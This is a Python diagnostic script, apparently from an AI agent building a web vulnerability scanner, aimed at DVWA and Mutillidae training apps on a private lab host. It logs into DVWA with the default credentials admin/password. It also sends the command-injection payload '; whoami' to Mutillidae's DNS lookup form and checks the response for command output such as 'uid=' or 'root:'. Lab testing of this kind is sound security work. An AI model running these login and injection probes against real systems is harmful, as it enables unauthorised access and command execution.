"""更深入诊断 - 检查 DVWA cookie 和 Mutillidae CMDi"""
import sys, asyncio, aiohttp
sys.path.insert(0, r"C:\Users\HZR\.qclaw\workspace-agent-b7ed571b\wvs-v18")

TARGET = "http://192.168.18.131"

async def check():
    async with aiohttp.ClientSession() as session:

        # 1. DVWA - 尝试默认登录获取 session cookie
        print("=" * 60)
        print("[1] DVWA Login Check")
        print("=" * 60)

        login_url = f"{TARGET}/dvwa/login.php"
        try:
            async with session.get(login_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                content = await resp.text()
                print(f"Login page: {resp.status}, length={len(content)}")
                # 找 CSRF token
                import re
                csrf_match = re.search(r'user_token.*?value=[\"\'](.*?)[\"\']', content)
                if csrf_match:
                    csrf = csrf_match.group(1)
                    print(f"CSRF token: {csrf}")
                    # 尝试默认密码 admin/password
                    login_data = {
                        "username": "admin",
                        "password": "password",
                        "Login": "Login",
                        "user_token": csrf
                    }
                    async with session.post(login_url, data=login_data, timeout=aiohttp.ClientTimeout(total=10)) as resp2:
                        content2 = await resp2.text()
                        print(f"Login response: {resp2.status}, length={len(content2)}")
                        if "index.php" in content2 or "Logout" in content2 or "dashboard" in content2.lower():
                            print("  -> LOGIN SUCCESS!")
                        elif "Login failed" in content2 or "incorrect" in content2.lower():
                            print("  -> LOGIN FAILED")
                        else:
                            print(f"  -> Content preview: {content2[:300]}")
                else:
                    print("No CSRF token found")
                    print(f"Content: {content[:500]}")
        except Exception as e:
            print(f"Error: {e}")

        # 2. Mutillidae - 直接测试 CMDi 看响应差异
        print("\n" + "=" * 60)
        print("[2] Mutillidae CMDi - Deeper Check")
        print("=" * 60)

        url = f"{TARGET}/mutillidae/index.php?page=dns-lookup.php"
        # 用 POST 测试
        try:
            # Baseline
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                baseline = await resp.text()
                print(f"GET baseline: {resp.status}, length={len(baseline)}")
                # 找表单 action
                form_match = re.search(r'<form[^>]*action=[\"\'](.*?)[\"\'](.*?)>(.*?)</form>', baseline, re.DOTALL)
                if form_match:
                    print(f"Form action: {form_match.group(1)}")
                # 找 input names
                inputs = re.findall(r'<input[^>]*name=[\"\'](.*?)[\"\']', baseline)
                print(f"Form inputs: {inputs}")
        except Exception as e:
            print(f"Error: {e}")

        # 测试带参数
        try:
            async with session.get(url, params={"dns_lookup_hostname": "127.0.0.1"}, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                content = await resp.text()
                print(f"\nGET with param: {resp.status}, length={len(content)}")
                if "127.0.0.1" in content:
                    print("  -> '127.0.0.1' reflected in content")
                # 找命令输出区域
                lookup_match = re.search(r'(?:result|output|response).*?(127\.0\.0\.1.*?)(?:</|$)', content, re.DOTALL | re.IGNORECASE)
                if lookup_match:
                    print(f"  -> Lookup result: {lookup_match.group(0)[:200]}")

                # 用命令注入 payload
                async with session.get(url, params={"dns_lookup_hostname": "; whoami"}, timeout=aiohttp.ClientTimeout(total=10)) as resp2:
                    content2 = await resp2.text()
                    print(f"\nGET with ; whoami: {resp2.status}, length={len(content2)}")
                    if len(content2) != len(content):
                        print(f"  -> Length changed: {len(content)} -> {len(content2)}")
                    # 搜索命令输出
                    for pattern in ["www-data", "daemon", "root:", "uid=", "gid=", "apache"]:
                        if pattern in content2:
                            idx = content2.index(pattern)
                            print(f"  -> Found '{pattern}' at pos {idx}: ...{content2[max(0,idx-20):idx+40]}...")

                    # Diff 找新增内容
                    if len(content2) > len(content):
                        extra = content2[len(content):]
                        if extra.strip():
                            print(f"  -> Extra content: {extra[:200]}")
                    else:
                        # 逐行比较
                        lines2 = content2.split("\n")
                        lines1 = content.split("\n")
                        for i, (l1, l2) in enumerate(zip(lines1, lines2)):
                            if l1 != l2:
                                print(f"  -> Line {i} differs:")
                                print(f"     Baseline: {l1[:100]}")
                                print(f"     Inject:   {l2[:100]}")
                                break
        except Exception as e:
            print(f"Error: {e}")

asyncio.run(check())
